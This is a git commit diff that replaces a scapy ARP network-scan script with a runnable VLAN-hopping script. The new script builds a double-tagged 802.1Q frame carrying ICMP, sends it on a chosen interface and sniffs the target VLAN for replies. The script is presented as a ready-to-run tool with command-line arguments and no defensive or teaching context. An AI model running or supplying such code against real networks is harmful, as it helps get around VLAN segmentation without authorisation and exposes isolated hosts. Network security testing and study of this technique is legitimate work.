3dbc873a7b777edbfb3ff5c00495b1b6f398aee9
Sahil Khan <71243964+sahil-z-khan@users.noreply.github.com>
2023-03-22 23:10:52 -0400

    Update network_discovery.py

--- network_discovery.py
+++ network_discovery.py
@@ -1,23 +1,30 @@
-from scapy.all import ARP, Ether, srp
-import ipaddress
+import sys
+from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, sniff
 
-# Set the IP range for your Class B network (example: '172.16.0.0/16')
-network_range = '172.16.0.0/16'
+def vlan_hopping(interface, native_vlan, target_vlan):
+    double_tagged_frame = (
+        Ether(src="00:11:22:33:44:55", dst="01:80:c2:00:00:00") /
+        Dot1Q(vlan=native_vlan) /
+        Dot1Q(vlan=target_vlan) /
+        IP(src="192.168.1.1", dst="192.168.1.2") /
+        ICMP()
+    )
 
-# Generate IP addresses within the specified network range
-network = ipaddress.IPv4Network(network_range, strict=False)
-ip_addresses = [str(ip) for ip in network]
+    def handle_packet(packet):
+        if packet.haslayer(ICMP):
+            print("Received response from target:")
+            packet.show()
 
-# Create an ARP request packet
-arp_request = ARP(pdst=ip_addresses)
-broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
-arp_request_broadcast = broadcast / arp_request
+    print("Sending double-tagged frame...")
+    sendp(double_tagged_frame, iface=interface, verbose=False)
 
-# Send the ARP request and collect responses
-answered, _ = srp(arp_request_broadcast, timeout=2, retry=1, verbose=False)
+    print("Sniffing for responses...")
+    sniff(iface=interface, filter=f"vlan {target_vlan} and icmp", prn=handle_packet, timeout=10)
 
-# Print the IP and MAC addresses of responding hosts
-print("IP Address\t\tMAC Address")
-print("-----------------------------------------")
-for sent, received in answered:
-    print(f"{received.psrc}\t\t{received.hwsrc}")
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python vlan_hopping.py <interface> <native_vlan> <target_vlan>")
+        sys.exit(1)
+
+    iface, native_vlan, target_vlan = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+    vlan_hopping(iface, native_vlan, target_vlan)
